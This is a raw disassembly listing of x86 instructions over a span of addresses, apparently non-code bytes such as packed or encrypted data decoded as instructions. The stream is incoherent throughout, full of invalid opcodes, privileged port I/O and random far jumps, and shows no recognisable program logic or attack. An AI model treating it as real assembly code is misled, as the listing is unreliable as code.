  4172dd:	cmp    DWORD PTR [ebx],edx
  4172df:	push   eax
  4172e0:	and    cl,dl
  4172e2:	xchg   BYTE PTR [edx+ebp*2-0x4d],dh
  4172e6:	ja     0x41731f
  4172e8:	cmc    
  4172e9:	xor    dl,BYTE PTR [edi-0x73]
  4172ec:	dec    ecx
  4172ed:	sbb    esp,0x80e0fde8
  4172f3:	test   al,0x66
  4172f5:	xchg   ebp,eax
  4172f6:	mov    esi,0x17ab5977
  4172fb:	add    al,0xea
  4172fd:	dec    edi
  4172fe:	dec    esp
  4172ff:	es inc eax
  417301:	(bad)  
  417302:	cs cs daa 
  417305:	leave  
  417306:	or     BYTE PTR [ebp+0x24],0xa9
  41730a:	outs   dx,DWORD PTR ds:[esi]
  41730b:	mov    ah,0x85
  41730d:	cli    
  41730e:	es dec edi
  417310:	imul   esp,ebx,0x72141b74
  417316:	and    cl,dh
  417318:	rcl    ebx,0xaf
  41731b:	lods   al,BYTE PTR ds:[esi]
  41731c:	nop
  41731d:	jl     0x4172da
  41731f:	mov    bl,0xf6
  417321:	cmc    
  417322:	jo     0x4172a5
  417324:	inc    esi
  417325:	push   cs
  417326:	cwde   
  417327:	clc    
  417328:	cmp    ebx,DWORD PTR [edi]
  41732a:	lds    eax,FWORD PTR [ebx]
  41732c:	jbe    0x4172c9
  41732e:	mov    esi,0x36038a06
  417333:	add    al,0xe2
  417335:	dec    eax
  417336:	jg     0x4173b3
  417338:	cmp    eax,0xf3853ce9
  41733d:	lods   al,BYTE PTR ds:[esi]
  41733e:	xchg   ecx,eax
  41733f:	imul   ebx,ebx,0xd0c49b8b
  417345:	sub    DWORD PTR [ebp+0x67ea0448],ecx
  41734b:	push   0x2d
  41734d:	cmp    al,0xfa
  41734f:	not    BYTE PTR [ecx+0x738dde8e]
  417355:	or     DWORD PTR [ebp+0x133a6b9e],esp
  41735b:	int3   
  41735c:	pop    ebp
  41735d:	mov    ebx,0xd4fc4fab
  417362:	in     al,dx
  417363:	or     esi,eax
  417365:	lods   eax,DWORD PTR ds:[esi]
  417366:	mul    bl
  417368:	and    bl,BYTE PTR [esi+0x1f35aa2]
  41736e:	push   0x927b646d
  417373:	xchg   edi,eax
  417374:	(bad)  
  417375:	mov    dh,0xf4
  417377:	mov    ds:0xcfa8f3f3,al
  41737c:	fldenv [edi-0x5b8cf335]
  417382:	test   eax,0x2e2f5af1
  417387:	mov    DWORD PTR [esi-0x31],esi
  41738a:	imul   edi,edx,0xec897c3e
  417390:	mov    esp,0xf2980db
  417395:	icebp  
  417396:	push   0x676c11c
  41739b:	sbb    al,0x5b
  41739d:	xor    eax,0xba1cd4cd
  4173a2:	out    dx,al
  4173a3:	fsub   QWORD PTR [edi]
  4173a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173a6:	ins    DWORD PTR es:[edi],dx
  4173a7:	mov    esi,0x8e34cd90
  4173ac:	mov    ?,WORD PTR [ecx-0x27449a02]
  4173b2:	mov    eax,0xad3822ec
  4173b7:	rcl    bl,cl
  4173b9:	and    dl,0x6
  4173bc:	dec    ecx
  4173bd:	aam    0x76
  4173bf:	outs   dx,BYTE PTR cs:[esi]
  4173c1:	dec    esp
  4173c2:	push   ebp
  4173c3:	arpl   sp,cx
  4173c5:	loopne 0x41737e
  4173c7:	xor    BYTE PTR [ebx+ecx*1],0x1d
  4173cb:	inc    ebx
  4173cc:	add    al,0x9e
  4173ce:	repz dec ecx
  4173d0:	push   ebx
  4173d1:	jge    0x41738d
  4173d3:	mov    ch,0xe7
  4173d5:	icebp  
  4173d6:	cmp    al,0xfe
  4173d8:	mov    al,ds:0xd2ca2132
  4173dd:	mov    fs,WORD PTR [esi]
  4173df:	(bad)  
  4173e0:	gs hlt 
  4173e2:	mov    WORD PTR [edx+0xa895bfb],?
  4173e8:	push   ds
  4173e9:	outs   dx,DWORD PTR ds:[esi]
  4173ea:	out    0x1e,al
  4173ec:	mov    ah,BYTE PTR [ebp-0x15848707]
  4173f2:	pop    ecx
  4173f3:	jno    0x4173d8
  4173f5:	xor    DWORD PTR [edx],0xb
  4173f8:	outs   dx,BYTE PTR ds:[esi]
  4173f9:	add    ebx,DWORD PTR [ebp+0x1a8c85ba]
  4173ff:	pop    ds
  417400:	mov    dl,0x96
  417402:	pop    esi
  417403:	cld    
  417404:	dec    ecx
  417405:	cmp    al,0xcb
  417407:	stc    
  417408:	sar    ch,0xc8
  41740b:	jb     0x4173a7
  41740d:	cmp    al,0xd2
  41740f:	mov    al,0x23
  417411:	add    DWORD PTR [ebx-0x5977211f],ebp
  417417:	ins    DWORD PTR es:[edi],dx
  417418:	jo     0x417462
  41741a:	xchg   DWORD PTR [ebp+0x5b],esi
  41741d:	sbb    eax,0xb9ec80c9
  417422:	shl    BYTE PTR [esi],cl
  417424:	addr16 push esp
  417426:	test   BYTE PTR [edi+0x5f41c249],ch
  41742c:	mov    ebx,esi
  41742e:	in     eax,0x54
  417430:	cmp    al,0x73
  417432:	dec    edi
  417433:	xchg   ebx,eax
  417434:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417435:	inc    ebx
  417436:	sub    BYTE PTR [ebx-0x66],bh
  417439:	(bad)  [ebx]
  41743b:	push   ebp
  41743c:	data16 out 0xa5,al
  41743f:	aaa    
  417440:	fmul   DWORD PTR [ecx+0x60272f2d]
  417446:	xor    eax,0xa90907b4
  41744b:	jbe    0x417402
  41744d:	cmp    BYTE PTR [ecx-0x21],0xd1
  417451:	js     0x417449
  417453:	sti    
  417454:	inc    ebx
  417455:	mov    ecx,0x3779f56
  41745a:	fwait
  41745b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41745c:	stos   BYTE PTR es:[edi],al
  41745d:	mov    dl,0xcc
  41745f:	jl     0x4174b1
  417461:	cli    
  417462:	daa    
  417463:	and    DWORD PTR [edx],esp
  417465:	jg     0x41740c
  417467:	aad    0x8f
  417469:	sbb    DWORD PTR [esi+0x3d86218f],edx
  41746f:	call   0x5f5053d6
  417474:	pop    ebp
  417475:	imul   ebx,DWORD PTR [ebx],0xffffffe6
  417478:	data16 mul BYTE PTR [ecx-0x5cd6e25c]
  41747f:	sbb    DWORD PTR [ebp-0x3c],0xd01df8b4
  417486:	call   0x229b2c9f
  41748b:	(bad)  
  41748c:	das    
  41748d:	fiadd  WORD PTR [ecx+0x41]
  417491:	dec    eax
  417492:	or     esi,esi
  417494:	sub    eax,0x8569bab0
  417499:	mov    esi,DWORD PTR [edi+eax*8+0x29]
  41749d:	inc    esi
  41749e:	sbb    BYTE PTR ds:0x447a4f6b,bh
  4174a4:	loope  0x417491
  4174a6:	int    0xd1
  4174a8:	addr16 into 
  4174aa:	pop    esp
  4174ab:	sbb    DWORD PTR [eax],ecx
  4174ad:	mov    WORD PTR [esi+0x6d6523f9],fs
  4174b3:	adc    ch,0x41
  4174b6:	iret   
  4174b7:	jmp    FWORD PTR [edi]
  4174b9:	fstp   QWORD PTR [eax+ecx*8-0x73db4e14]
  4174c0:	(bad)  
  4174c3:	test   eax,0x5083d357
  4174c8:	test   DWORD PTR [eax],eax
  4174ca:	push   edx
  4174cb:	loopne 0x4174e8
  4174cd:	jb     0x41754b
  4174cf:	int    0xa2
  4174d1:	xor    BYTE PTR [edx],0x8f
  4174d4:	mov    ebx,0xa58694c0
  4174d9:	push   cs
  4174da:	leave  
  4174db:	jl     0x417478
  4174dd:	push   ds
  4174de:	pop    ds
  4174df:	repnz scas al,BYTE PTR es:[edi]
  4174e1:	ja     0x4174df
  4174e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174e4:	mov    bh,0x43
  4174e6:	jo     0x417550
  4174e8:	dec    ebp
  4174e9:	mov    bl,0x1
  4174eb:	mov    ds:0x1d028438,al
  4174f0:	inc    esp
  4174f1:	int    0xd7
  4174f3:	f2xm1  
  4174f5:	jle    0x41751a
  4174f7:	mov    ebp,0x5a642c50
  4174fc:	cmc    
  4174fd:	ins    BYTE PTR es:[edi],dx
  4174fe:	out    0x2c,eax
  417500:	out    dx,eax
  417501:	sub    cl,BYTE PTR [eax-0x1dd98511]
  417507:	sbb    BYTE PTR [ecx],bh
  417509:	popf   
  41750a:	daa    
  41750b:	mov    ebx,0x901dfbaa
  417510:	push   ebp
  417511:	push   0xd53e4224
  417516:	(bad)  
  417517:	scas   al,BYTE PTR es:[edi]
  417518:	adc    eax,0xf6e62a2e
  41751d:	mov    esi,0x9036ca4f
  417522:	inc    edx
  417523:	push   edi
  417525:	add    eax,0xf558558f
  41752a:	int    0x5
  41752c:	add    DWORD PTR [edx+edx*8],ecx
  41752f:	test   DWORD PTR [eax+0x7e],ecx
  417532:	scas   al,BYTE PTR es:[edi]
  417533:	jbe    0x417557
  417535:	mov    ch,0x91
  417537:	push   ds
  417538:	bound  esi,QWORD PTR [esi+edx*4-0x14]
  41753c:	inc    ecx
  41753d:	stos   DWORD PTR es:[edi],eax
  41753e:	sub    eax,0xde2baf24
  417543:	mov    bl,0x20
  417545:	add    DWORD PTR [edi+0x6aafdef0],0xffffffe9
  41754c:	jne    0x417546
  41754e:	cwde   
  41754f:	mov    ds,edi
  417551:	xchg   esi,eax
  417552:	jg     0x417526
  417554:	jo     0x4175d4
  417556:	retf   0x3c22
  417559:	jne    0x4175bc
  41755b:	adc    eax,0x81585817
  417560:	out    0xc1,al
  417562:	pop    esi
  417563:	jne    0x417507
  417565:	xchg   esp,eax
  417566:	add    BYTE PTR [edi],bl
  417568:	fadd   DWORD PTR [eax]
  41756a:	jbe    0x417509
  41756c:	dec    ebx
  41756d:	fsub   QWORD PTR [ebx+0x7]
  417570:	mov    ds:0x2052ab91,al
  417575:	(bad)  ds:0x4568c37c
  41757b:	arpl   bp,si
  41757d:	pop    esi
  41757e:	stos   BYTE PTR es:[edi],al
  41757f:	jne    0x4175fa
  417581:	mov    edi,0xa62fdab4
  417586:	adc    eax,DWORD PTR [eax-0x78]
  417589:	loop   0x4175b1
  41758b:	ret    0xbfc
  41758e:	fiadd  WORD PTR [ecx+0x38b5a7c0]
  417594:	stos   BYTE PTR es:[edi],al
  417595:	jle    0x4175c3
  417597:	mov    BYTE PTR [eax+0x33d26aa5],0x1b
  41759e:	fldz   
  4175a0:	push   esi
  4175a1:	add    al,0x7a
  4175a3:	add    eax,0x4ebd9dbe
  4175a8:	out    0x1a,al
  4175aa:	ins    DWORD PTR es:[edi],dx
  4175ab:	stos   DWORD PTR es:[edi],eax
  4175ac:	stos   BYTE PTR es:[edi],al
  4175ad:	push   ss
  4175ae:	and    BYTE PTR [edx],bl
  4175b0:	into   
  4175b1:	push   ecx
  4175b2:	aam    0x13
  4175b4:	ja     0x4175d5
  4175b6:	ror    BYTE PTR [ebx],1
  4175b8:	xor    ecx,DWORD PTR [eax]
  4175ba:	dec    esp
  4175bb:	fisttp QWORD PTR [ebp-0x275e89b6]
  4175c1:	sub    edi,ebp
  4175c3:	lods   eax,DWORD PTR ds:[esi]
  4175c4:	mov    bh,0xbf
  4175c6:	jmp    0x4175fd
  4175c8:	stos   DWORD PTR es:[edi],eax
  4175c9:	pop    eax
  4175ca:	ins    DWORD PTR es:[edi],dx
  4175cb:	pop    ecx
  4175cc:	jbe    0x4175ba
  4175ce:	cmp    bl,BYTE PTR [ecx+ecx*4]
  4175d1:	sbb    bh,BYTE PTR [esi]
  4175d3:	push   es
  4175d4:	push   cs
  4175d5:	xor    al,0xf3
  4175d7:	inc    ebx
  4175d8:	push   cs
  4175d9:	ret    
  4175da:	stos   BYTE PTR es:[edi],al
  4175db:	ficomp WORD PTR [ecx*1-0x22f4debc]
  4175e2:	into   
  4175e3:	jg     0x417660
  4175e5:	imul   edx,DWORD PTR [esi],0x7c
  4175e8:	fistp  DWORD PTR [edi+0x359474ec]
  4175ee:	cmp    al,0xa
  4175f0:	retf   0xf1ff
  4175f3:	adc    eax,0xe19fc741
  4175f8:	mov    BYTE PTR [eax+0x5fc54ca5],dl
  4175fe:	mov    ch,0xe9
  417600:	leave  
  417601:	rol    BYTE PTR [esi+edx*8],0x9a
  417605:	lahf   
  417606:	(bad)  
  417607:	ins    DWORD PTR es:[edi],dx
  417608:	push   0xd8bb323
  41760d:	dec    esp
  41760e:	mov    ecx,0xbf61ed3b
  417613:	mov    edi,0x79d9bd18
  417618:	or     al,0xf3
  41761a:	shl    BYTE PTR [ebx-0x159b5dc5],0xea
  417621:	ins    BYTE PTR es:[edi],dx
  417622:	push   ebp
  417623:	popa   
  417624:	ja     0x4175b4
  417626:	fstp   QWORD PTR [esi+ebx*8+0x3959881c]
  41762d:	mov    al,ds:0x8e655100
  417632:	in     al,0x67
  417634:	inc    edx
  417635:	push   edx
  417636:	push   0xffffffd4
  417638:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417639:	mov    edx,0xbeb8972f
  41763e:	in     eax,dx
  41763f:	jbe    0x4176af
  417641:	jne    0x417682
  417643:	push   esi
  417644:	rcl    BYTE PTR [ebx-0x3b5f92a3],cl
  41764a:	call   0xa668:0xc2a28a4f
  417651:	mov    WORD PTR [eax],?
  417653:	dec    esp
  417654:	ja     0x417671
  417656:	push   edx
  417657:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417658:	jg     0x417698
  41765a:	mov    ebx,0xba9feb
  41765f:	repz imul eax,DWORD PTR [esi+eax*2+0x41],0xffffffb9
  417665:	sti    
  417666:	rol    BYTE PTR [eax+0x62],0xc7
  41766a:	add    DWORD PTR [ebp-0x62e42f6],edx
  417670:	lds    ebx,FWORD PTR [edi]
  417672:	cmp    eax,0x47f753ce
  417677:	or     al,ah
  417679:	or     eax,0xc9a2db8d
  41767e:	les    ecx,FWORD PTR [esi+0x7af14611]
  417684:	xor    dh,BYTE PTR [esi]
  417686:	cwde   
  417687:	mov    DWORD PTR [edi-0x3d5edc0f],ebp
  41768d:	sti    
  41768e:	cmp    al,BYTE PTR [edi+0x71]
  417691:	inc    esi
  417692:	xchg   edx,eax
  417693:	lock cmc 
  417695:	out    0x43,eax
  417697:	jl     0x4176db
  417699:	shl    BYTE PTR [edi+0x32ddc336],cl
  41769f:	jae    0x417647
  4176a1:	or     DWORD PTR [ecx+ebp*4],0xffffff82
  4176a5:	dec    eax
  4176a6:	(bad)  
  4176a7:	pusha  
  4176a8:	pop    ds
  4176a9:	and    BYTE PTR [edx-0x655c559f],0x83
  4176b0:	inc    edx
  4176b1:	xlat   BYTE PTR ds:[ebx]
  4176b2:	sub    eax,0x8c6923ed
  4176b7:	mov    ds:0x8c3c5ad2,al
  4176bc:	pop    ds
  4176bd:	js     0x4176e9
  4176bf:	mov    dl,0x7f
  4176c1:	sbb    dl,cl
  4176c3:	pop    edi
  4176c4:	jecxz  0x41771b
  4176c6:	imul   ecx,edx,0xfffffffe
  4176c9:	(bad)  
  4176ca:	xor    eax,0x4b78b8a9
  4176cf:	pushf  
  4176d0:	jae    0x4176fc
  4176d2:	shl    BYTE PTR [eax+0x73c68e4e],cl
  4176d8:	xor    dl,BYTE PTR [ecx-0x4]
  4176db:	pop    esp
  4176dc:	dec    ebx
  4176dd:	repnz mov bh,0xf5
  4176e0:	sbb    dl,BYTE PTR [ebp-0x3d0c454a]
  4176e6:	aaa    
  4176e7:	jne    0x4176c1
  4176e9:	jo     0x4176c6
  4176eb:	adc    eax,0x3c5d8969
  4176f0:	bnd jge 0x41771c
  4176f3:	push   ebx
  4176f4:	test   ecx,ecx
  4176f6:	or     DWORD PTR [ebp+0x2ecf9493],ebp
  4176fc:	xchg   edx,eax
  4176fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176fe:	jmp    0x41775f
  417700:	sub    al,0x56
  417702:	jmp    0x4176ce
  417704:	popa   
  417705:	lock or ecx,ecx
  417708:	mov    edx,0x72e4d35f
  41770d:	xchg   esi,eax
  41770e:	sti    
  41770f:	mov    ebp,0x8f1f66ae
  417714:	mov    ecx,0xdd97013d
  417719:	lea    ebx,[ebp-0x79b6a893]
  41771f:	jle    0x41771f
  417721:	(bad)  
  417722:	aaa    
  417723:	lods   eax,DWORD PTR ds:[esi]
  417724:	mov    esi,0x1f7b9b38
  417729:	or     dh,BYTE PTR [edi]
  41772b:	scas   eax,DWORD PTR es:[edi]
  41772c:	(bad)  
  41772d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41772e:	dec    ecx
  41772f:	sti    
  417730:	jmp    0x7ed2:0x7e99f57c
  417737:	adc    al,0x8c
  417739:	hlt    
  41773a:	(bad)  
  41773b:	sub    esp,DWORD PTR [edi+0x3f4dba9d]
  417741:	xchg   edx,eax
  417742:	shr    DWORD PTR [esi+0x59],cl
  417745:	xchg   edi,eax
  417746:	popf   
  417747:	xor    edx,DWORD PTR [edi+0x2a]
  41774a:	mov    edi,0xc4a70aec
  41774f:	pop    ebp
  417750:	mov    eax,fs
  417752:	sbb    bl,BYTE PTR [esp+ecx*2]
  417755:	scas   al,BYTE PTR es:[edi]
  417756:	jmp    0x4177a6
  417758:	mov    ecx,0x6268e6ff
  41775d:	(bad)  
  41775e:	aaa    
  41775f:	out    0xd2,eax
  417761:	sub    al,0xa0
  417763:	out    0xee,eax
  417765:	jns    0x4176fc
  417767:	pop    edx
  417768:	jge    0x41773f
  41776a:	push   esi
  41776b:	xchg   BYTE PTR [edi+eax*4+0x509710da],bl
  417772:	mov    edi,DWORD PTR [esi-0x6f410c7c]
  417778:	or     eax,0x59b18410
  41777d:	gs inc ecx
  41777f:	stc    
  417780:	lea    esi,[edi]
  417782:	or     dl,BYTE PTR [esi+edx*1-0x58]
  417786:	push   edi
  417787:	pushf  
  417788:	push   edi
  417789:	repz js 0x41771c
  41778c:	aam    0xfe
  41778e:	jge    0x417730
  417790:	xchg   edi,eax
  417791:	(bad)  
  417792:	push   edx
  417793:	push   ebp
  417794:	jge    0x417786
  417796:	shl    DWORD PTR [edx-0x9],cl
  417799:	shl    BYTE PTR [ebp-0x55],1
  41779c:	lds    ecx,FWORD PTR [eax+eiz*8+0x6bc7436d]
  4177a3:	out    dx,al
  4177a4:	faddp  st(4),st
  4177a6:	cwde   
  4177a7:	cmp    al,0xdd
  4177a9:	fistp  WORD PTR [ebx+0x506a65e]
  4177af:	and    al,BYTE PTR [ebx]
  4177b1:	push   0x1
  4177b3:	inc    edi
  4177b4:	stc    
  4177b5:	dec    bl
  4177b7:	sti    
  4177b8:	add    BYTE PTR [ecx+0x6],0x51
  4177bc:	lock mov WORD PTR cs:[esi+eiz*4+0x5ccb2d23],gs
  4177c5:	mov    edi,DWORD PTR [edx]
  4177c7:	dec    esi
  4177c8:	fs in  al,0x92
  4177cb:	mov    al,0xde
  4177cd:	dec    ebx
  4177ce:	ret    0x9d84
  4177d1:	mov    bh,0xde
  4177d3:	push   cs
  4177d4:	shr    DWORD PTR [ecx],1
  4177d6:	rcr    BYTE PTR [edx+0x47c64b45],1
  4177dc:	test   eax,0xeddf6e48
  4177e1:	push   eax
  4177e2:	cmp    cl,BYTE PTR [eax+eax*1-0x7d]
  4177e6:	addr16 shl cl,cl
  4177e9:	retf   
  4177ea:	mov    cl,0x91
  4177ec:	scas   al,BYTE PTR es:[edi]
  4177ed:	jbe    0x417833
  4177ef:	(bad)  
  4177f0:	sbb    al,0x31
  4177f2:	mov    si,0x894f
  4177f6:	push   ebp
  4177f7:	dec    ecx
  4177f8:	cmp    edi,DWORD PTR [eax+edi*1+0x51]
  4177fc:	test   DWORD PTR [edx+0x52bbcf8f],eax
  417802:	das    
  417803:	fadd   DWORD PTR [edx-0x4a]
  417806:	mov    eax,ds:0x2055a935
  41780b:	xchg   esi,eax
  41780c:	adc    ch,BYTE PTR [ebp-0x71]
  41780f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417810:	retf   
  417811:	test   al,0xb6
  417813:	sbb    edx,ebx
  417815:	(bad)  [edx+edx*1+0x49]
  417819:	inc    ecx
  41781a:	test   eax,0xcd378b3e
  41781f:	call   0x58d2:0x2fe8ae1f
  417826:	and    ecx,DWORD PTR [eax+0x5f088aaf]
  41782c:	add    al,0x26
  41782e:	or     DWORD PTR es:[esi-0x5f0982b3],ebx
  417835:	fisub  WORD PTR [edi+edi*4-0x66]
  417839:	sbb    eax,0x8c6af66
  41783e:	out    0x6b,eax
  417840:	in     eax,0x7c
  417842:	xlat   BYTE PTR ds:[ebx]
  417843:	arpl   sp,ax
  417845:	dec    eax
  417846:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417847:	in     al,dx
  417848:	ret    0x414
  41784b:	push   0xffffff89
  41784d:	mov    bl,0xa9
  41784f:	xchg   esp,eax
  417850:	jo     0x417878
  417852:	mov    edx,ebp
  417854:	and    DWORD PTR [ecx],eax
  417856:	int    0xb5
  417858:	(bad)  
  417859:	mov    al,ds:0xb5b1cf73
  41785e:	mov    dh,0xb
  417860:	cmp    bh,BYTE PTR [esp+ebx*1+0x240ef139]
  417867:	pop    ebx
  417868:	pop    ebx
  417869:	sub    eax,0xf422f09f
  41786e:	or     edx,ebx
  417870:	pop    edi
  417871:	(bad)  
  417872:	ds gs clc 
  417875:	adc    eax,0xe3e38969
  41787a:	dec    ecx
  41787b:	push   ebp
  41787c:	xor    BYTE PTR [ebp+0x66b676d7],dh
  417882:	dec    eax
  417883:	add    eax,0x2af2cd22
  417888:	leave  
  417889:	sbb    BYTE PTR [esi+0x2f6567f8],al
  41788f:	or     BYTE PTR ds:0xc9eb85c3,0x70
  417896:	xor    ebp,ebx
  417898:	lea    ebp,[edi]
  41789a:	inc    esp
  41789b:	shl    eax,cl
  41789d:	ret    0x6f35
  4178a0:	adc    eax,0xa63a5647
  4178a5:	or     ah,al
  4178a7:	in     al,dx
  4178a8:	dec    ecx
  4178a9:	arpl   WORD PTR [ebp+ecx*2+0x1c],dx
  4178ad:	sub    BYTE PTR [edx-0x67],al
  4178b0:	inc    ebx
  4178b1:	mov    al,0x28
  4178b3:	cmp    ah,cl
  4178b5:	mov    ecx,0x2e02ce9b
  4178ba:	sahf   
  4178bb:	fsub   st,st(2)
  4178bd:	sbb    edx,ecx
  4178bf:	sbb    al,0x55
  4178c1:	fadd   st(5),st
  4178c3:	iret   
  4178c4:	push   0x1a659b31
  4178c9:	aas    
  4178ca:	xor    ecx,ecx
  4178cc:	fadd   DWORD PTR [ecx+eiz*8]
  4178cf:	inc    esp
  4178d0:	mov    WORD PTR [ecx-0x65],fs
  4178d3:	(bad)  
  4178d4:	into   
  4178d5:	jbe    0x4178c0
  4178d7:	jg     0x417944
  4178d9:	pop    esp
  4178da:	jle    0x4178b0
  4178dc:	adc    ebp,DWORD PTR [esi-0x3ffe7b3c]
  4178e2:	es pop ebp
  4178e4:	sbb    al,0xb5
  4178e6:	out    dx,eax
  4178e7:	dec    esi
  4178e8:	xor    eax,0x15553e8d
  4178ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178ee:	pushf  
  4178ef:	hlt    
  4178f0:	fild   DWORD PTR [ecx+eax*2]
  4178f3:	cmc    
  4178f4:	pop    ecx
  4178f5:	push   0xffffffc3
  4178f7:	outs   dx,BYTE PTR fs:[esi]
  4178f9:	pop    es
  4178fa:	shr    BYTE PTR [ebp+0x26],0xfa
  4178fe:	pop    ecx
  4178ff:	hlt    
  417900:	cmp    bl,BYTE PTR [edx]
  417902:	mov    bl,0x40
  417904:	call   FWORD PTR [ecx]
  417906:	push   ebp
  417907:	shl    DWORD PTR [ebx],1
  417909:	mov    ch,0x16
  41790b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41790c:	cmp    DWORD PTR [ebx-0x3cc5a1e4],ebp
  417912:	stos   DWORD PTR es:[edi],eax
  417913:	call   0x4bb5aa96
  417918:	enter  0x2ad3,0xbf
  41791c:	lods   eax,DWORD PTR ds:[esi]
  41791d:	and    al,0x83
  41791f:	repnz pusha 
  417921:	iret   
  417922:	or     al,0xe2
  417924:	mov    bl,0xb6
  417926:	out    0x4b,eax
  417928:	inc    eax
  417929:	mov    ah,0xe3
  41792b:	loope  0x4178ea
  41792d:	pop    esi
  41792e:	xor    BYTE PTR [esi],ch
  417930:	xor    WORD PTR [ecx+0x4668c4f],0x9eb2
  417939:	and    al,0x1b
  41793b:	sbb    dh,ch
  41793d:	or     DWORD PTR [esi],ecx
  41793f:	push   ebx
  417940:	xor    BYTE PTR [edx],0x23
  417943:	repz sub BYTE PTR [ecx+ebp*8],0xb5
  417948:	cmp    BYTE PTR [ecx-0x2476be3],dh
  41794e:	arpl   WORD PTR [ecx+0x6da5a460],di
  417954:	into   
  417955:	retf   
  417956:	mov    ch,0xf6
  417958:	(bad)  
  417959:	sbb    al,0x9f
  41795b:	jle    0x4179d6
  41795d:	outs   dx,DWORD PTR ds:[esi]
  41795e:	mov    cl,0x13
  417960:	dec    esp
  417961:	pop    eax
  417962:	bound  edi,QWORD PTR [ebx-0x2c2b2639]
  417968:	adc    ebx,DWORD PTR [ebx-0x3319f958]
  41796e:	pop    edi
  41796f:	test   BYTE PTR [ecx],bh
  417971:	into   
  417972:	imul   esp,DWORD PTR [eax+eax*8],0x2b358385
  417979:	jno    0x4178fc
  41797b:	aaa    
  41797c:	retf   0xee04
  41797f:	cs add ecx,ebp
  417982:	ret    0x660b
  417985:	ds scas al,BYTE PTR es:[edi]
  417987:	fld    DWORD PTR [ebx]
  417989:	cs retf 
  41798b:	fs loopne 0x4179cd
  41798e:	mov    ah,0x26
  417990:	fcomi  st,st(3)
  417992:	aas    
  417993:	xor    dl,ch
  417995:	push   0xcda2c5d3
  41799a:	scas   al,BYTE PTR es:[edi]
  41799b:	adc    ecx,DWORD PTR [ecx+0x57]
  41799e:	pop    esi
  41799f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179a0:	push   edx
  4179a1:	daa    
  4179a2:	jae    0x417993
  4179a4:	ror    esp,1
  4179a6:	test   BYTE PTR [ebx-0x2cdedaeb],bl
  4179ac:	hlt    
  4179ad:	sbb    BYTE PTR [edx],bh
  4179af:	packuswb mm3,QWORD PTR [esi+esi*1-0x1]
  4179b4:	pause  
  4179b6:	mov    dh,0x2f
  4179b8:	cld    
  4179b9:	aad    0x68
  4179bb:	dec    edx
  4179bc:	cmp    ebp,DWORD PTR [esi]
  4179be:	or     DWORD PTR ds:0x87231240,0xfffffff1
  4179c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179c6:	iret   
  4179c7:	mov    ds:0x880c7d5d,eax
  4179cc:	or     BYTE PTR [edx+edx*1],0x32
  4179d0:	xor    al,0xaa
  4179d3:	push   ds
  4179d4:	jo     0x417a33
  4179d6:	mov    bh,0x17
  4179d8:	es dec ecx
  4179da:	mov    esp,0x40582bea
  4179df:	pushf  
  4179e0:	push   0xdf815833
  4179e5:	dec    esi
  4179e6:	std    
  4179e7:	cli    
  4179e8:	call   FWORD PTR [edx+esi*4]
  4179eb:	xchg   ecx,eax
  4179ec:	sbb    eax,0xbd617071
  4179f1:	call   0x3727:0x69063c43
  4179f8:	(bad)  
  4179f9:	jbe    0x417a35
  4179fb:	or     eax,0x7f660cda
  417a00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a01:	xchg   edx,eax
  417a02:	fldcw  WORD PTR [ecx-0x21d5b2a8]
  417a08:	in     eax,dx
  417a09:	lea    ecx,[ebp-0x3d6ec6cf]
  417a0f:	xchg   esp,eax
  417a10:	xor    DWORD PTR [esi-0x17],ecx
  417a13:	adc    al,0x6c
  417a15:	jmp    0x3622:0x1f5c81a1
  417a1c:	pop    es
  417a1d:	dec    ecx
  417a1e:	(bad)  
  417a1f:	nop
  417a20:	mov    bl,0x19
  417a22:	lahf   
  417a23:	pop    es
  417a24:	sbb    al,BYTE PTR [ebx]
  417a26:	and    al,dl
  417a28:	in     al,0xcb
  417a2a:	cli    
  417a2b:	push   esi
  417a2c:	push   edx
  417a2d:	mov    ds:0x4a2ca89f,al
  417a32:	sub    eax,0x6d49152f
  417a37:	mov    ds:0x536cffff,eax
  417a3c:	into   
  417a3d:	add    BYTE PTR [edi+esi*4],cl
  417a40:	and    al,0x86
  417a42:	mov    esp,0x70a51b2c
  417a47:	shl    DWORD PTR [esi],1
  417a49:	xchg   edx,eax
  417a4a:	out    dx,eax
  417a4b:	imul   eax,DWORD PTR [ebp-0x6ad46c13],0x72
  417a52:	neg    BYTE PTR [eax+0xcfd0c45]
  417a58:	fs xchg esp,eax
  417a5a:	mov    dl,0xf7
  417a5c:	(bad)  
  417a5d:	fist   WORD PTR [edx-0x4e]
  417a60:	add    ecx,DWORD PTR [ebp-0x69503180]
  417a66:	(bad)  
  417a67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a68:	ins    BYTE PTR es:[edi],dx
  417a69:	fcomi  st,st(4)
  417a6b:	jae    0x417a47
  417a6d:	mov    ebx,DWORD PTR [ebp-0x722332a8]
  417a73:	dec    edi
  417a74:	jmp    0x42b7:0xfe055f1e
  417a7b:	cmp    cl,BYTE PTR [ebx+0x76]
  417a7e:	dec    eax
  417a7f:	and    al,al
  417a81:	pop    ds
  417a82:	push   esi
  417a83:	sbb    DWORD PTR [eax-0x6dfde4d7],0x70
  417a8a:	cmp    BYTE PTR [eax],dl
  417a8c:	pop    ecx
  417a8d:	push   edi
  417a8e:	shr    BYTE PTR [eax],1
  417a90:	lahf   
  417a91:	test   dh,0xea
  417a94:	dec    esi
  417a95:	imul   ebp,DWORD PTR [eax],0x593e96f1
  417a9b:	xor    DWORD PTR [ebx+0x78052610],edi
  417aa1:	add    DWORD PTR [edi+0x3e60d722],0x56
  417aa8:	xor    cl,bl
  417aaa:	pop    esi
  417aab:	cs js  0x417ad1
